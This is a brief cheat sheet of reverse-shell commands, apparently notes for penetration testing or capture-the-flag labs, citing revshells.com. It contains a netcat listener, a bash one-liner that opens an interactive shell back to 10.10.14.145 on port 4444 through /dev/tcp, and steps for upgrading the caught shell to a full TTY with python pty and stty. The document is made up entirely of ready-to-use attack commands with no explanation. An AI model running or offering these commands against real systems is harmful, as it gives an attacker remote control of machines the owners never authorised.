https://www.revshells.com/

```bash
nc -lvnp 4444
bash -c '/bin/bash -i >& /dev/tcp/10.10.14.145/4444 0>&1'
```

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z
stty raw -echo; fg; ls; export SHELL=/bin/bash
export TERM=xterm; stty rows 51 columns 189
reset
```
